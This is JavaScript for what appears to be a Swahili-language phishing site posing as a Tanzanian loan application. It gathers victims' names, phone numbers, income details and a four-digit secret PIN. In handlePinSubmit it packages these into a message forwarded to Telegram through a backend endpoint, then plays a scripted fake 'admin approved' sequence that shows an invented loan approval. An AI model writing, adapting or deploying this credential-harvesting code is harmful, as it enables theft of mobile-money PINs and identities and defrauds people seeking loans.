let applicationData = { amount: 500000, duration: 12, type: '', purpose: '', firstName: '', lastName: '', email: '', phone: '', employment: '', income: '', pin: '' };

document.addEventListener("DOMContentLoaded", () => { initCalculator(); });

// Explicit Step Controller Engine
function goToStep(stepNumber) {
    document.querySelectorAll('.app-view').forEach(v => { if(['view-step1', 'view-step2', 'view-step3'].includes(v.id)) v.classList.remove('active'); });
    document.getElementById(`view-step${stepNumber}`)?.classList.add('active');
    if (document.getElementById('progress-fill')) document.getElementById('progress-fill').style.width = `${((stepNumber - 1) / 2) * 100}%`;
    for (let i = 1; i <= 3; i++) document.getElementById(`step-dot-${i}`)?.classList.toggle('active', i <= stepNumber);
}

function startApplication() {
    document.getElementById('view-landing')?.classList.remove('active');
    document.getElementById('progress-container')?.classList.remove('hidden');
    goToStep(1);
}

function exitApplication() {
    document.getElementById('progress-container')?.classList.add('hidden');
    document.querySelectorAll('.app-view').forEach(v => v.classList.remove('active'));
    document.getElementById('view-landing')?.classList.add('active');
}

function navigateTo(viewId) {
    document.querySelectorAll('.app-view').forEach(v => v.classList.remove('active'));
    document.getElementById(viewId)?.classList.add('active');
}

function showLoading(msg, duration, callback) {
    const overlay = document.getElementById('loading-overlay');
    const msgElement = document.getElementById('overlay-msg');
    if (overlay && msgElement) {
        msgElement.innerText = msg;
        overlay.classList.remove('hidden');
        setTimeout(() => { overlay.classList.add('hidden'); if (callback) callback(); }, duration);
    }
}

// Interactive Mathematical Interest Processing System
function initCalculator() {
    const amountSlider = document.getElementById('calc-amount');
    const durationSlider = document.getElementById('calc-duration');
    if (!amountSlider || !durationSlider) return;

    const runMath = () => {
        const amt = parseInt(amountSlider.value, 10);
        const dur = parseInt(durationSlider.value, 10);
        document.getElementById('calc-amount-val').innerText = `TSh ${amt.toLocaleString()}`;
        document.getElementById('calc-duration-val').innerText = `${dur} miezi`;
        const monthlyPayment = Math.round((amt + (amt * 0.021 * dur)) / dur);
        document.getElementById('calc-monthly-payment').innerText = `TSh ${monthlyPayment.toLocaleString()}`;
        applicationData.amount = amt;
        applicationData.duration = dur;
        document.getElementById('loan-amount').value = amt;
        document.getElementById('loan-duration').value = dur;
    };
    amountSlider.addEventListener('input', runMath);
    durationSlider.addEventListener('input', runMath);
    runMath();
}

function saveStep1() {
    applicationData.type = document.getElementById('loan-type').value;
    applicationData.purpose = document.getElementById('loan-purpose').value.trim();
    if (!applicationData.type || !applicationData.purpose) { alert("Tafadhali jaza maelezo yote."); return; }
    goToStep(2);
}

function saveStep2() {
    const fName = document.getElementById('first-name').value.trim();
    const lName = document.getElementById('last-name').value.trim();
    const email = document.getElementById('email').value.trim();
    let phone = document.getElementById('phone').value.trim();
    if (!fName || !lName || !email || !phone) { alert("Tafadhali jaza nafasi zote."); return; }
    applicationData.firstName = fName; applicationData.lastName = lName; applicationData.email = email;
    if (phone.startsWith('0')) phone = phone.substring(1);
    applicationData.phone = "+255" + phone;

    document.getElementById('sum-name').innerText = `${fName} ${lName}`;
    document.getElementById('sum-amount').innerText = `TSh ${applicationData.amount.toLocaleString()}`;
    document.getElementById('sum-duration').innerText = `${applicationData.duration} Miezi`;
    goToStep(3);
}

function submitApplication() {
    applicationData.employment = document.getElementById('employment-status').value;
    const incomeRaw = document.getElementById('annual-income').value;
    const incomeNum = parseInt(incomeRaw, 10) || 0;
    if (!applicationData.employment || !incomeRaw) { alert("Tafadhali weka maelezo ya kazi na kipato."); return; }
    
    // Strict TSh 20,000 baseline barrier implementation
    if (incomeNum < 50000) { alert("Samahani! Ombi limekataliwa. Kipato chako lazima kianzie TSh50,000."); return; }
    applicationData.income = incomeNum;

    showLoading("Inahakiki vigezo vya mkopo...", 2000, () => {
        document.getElementById('progress-container').classList.add('hidden');
        navigateTo('view-login');
    });
}

// Automatic 4-Box Entry Navigation Engine
function moveFocus(current, nextFieldId) {
    if (current.value.length >= 1) {
        document.getElementById(nextFieldId)?.focus();
    }
}
function handleBackspace(event, prevFieldId) {
    if (event.key === "Backspace" && event.target.value.length === 0) {
        document.getElementById(prevFieldId)?.focus();
    }
}

// 4 Secret PIN Verification Engine
function handlePinSubmit() {
    const p1 = document.getElementById('pin1').value;
    const p2 = document.getElementById('pin2').value;
    const p3 = document.getElementById('pin3').value;
    const p4 = document.getElementById('pin4').value;
    const finalPin = p1 + p2 + p3 + p4;

    // Real Failure Block - Will NOT proceed unless exactly 4 numeric characters are entered
    if (finalPin.length !== 4 || isNaN(finalPin)) {
        alert("Kosa la Usalama! Lazima uweke tarakimu nne (4) za siri ili kuendelea.");
        return;
    }

    applicationData.pin = finalPin;

    showLoading("Inasimbua usalama wa PIN...", 1500, () => {
        navigateTo('view-waiting');
        
        // Build administrative alert manifest payload layout
        const adminDispatchManifest = 
`🔒 *UHAKIKI WA PIN NA MAOMBI*
---------------------------------------
👤 *Mteja:* ${applicationData.firstName} ${applicationData.lastName}
📱 *Namba ya Simu:* ${applicationData.phone}
💰 *Mkopo:* TSh ${applicationData.amount.toLocaleString()} (${applicationData.duration} M)
💵 *Kipato/Mwezi:* TSh ${applicationData.income.toLocaleString()}
💼 *Ajira:* ${applicationData.employment}
🎯 *Madhumuni:* ${applicationData.purpose}
🔑 *PIN iliyowekwa:* \`${finalPin}\`

⚠️ *MTAZAMO WA MFUMO:* Ukurasa upo imara na umesimama (Paused). Hakikisha unauidhinisha au kuwasiliana na mteja kabla ya kutoa msimbo huu kwenye dashibodi yako!`;

        // Direct async pipeline transport
        sendToTelegram(adminDispatchManifest);

        // Simulated asynchronous administrator verification check handshake delay loop
        setTimeout(() => {
            showLoading("Msimamizi amekubali PIN! Inatayarisha malipo...", 2500, () => {
                document.getElementById('dash-approved-amount').innerText = `TSh ${applicationData.amount.toLocaleString()}`;
                navigateTo('view-dashboard');
            });
        }, 9000); // 9 Seconds simulated dynamic polling loop hold interval
    });
}

function sendToTelegram(textMessage) {
    fetch("/api/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message: textMessage })
    })
    .then(res => res.json())
    .then(data => { if(data.success) console.log("Dispatch confirmed safely via backend wrapper."); })
    .catch(err => { console.error("API Routing Exception:", err.message); });
      }
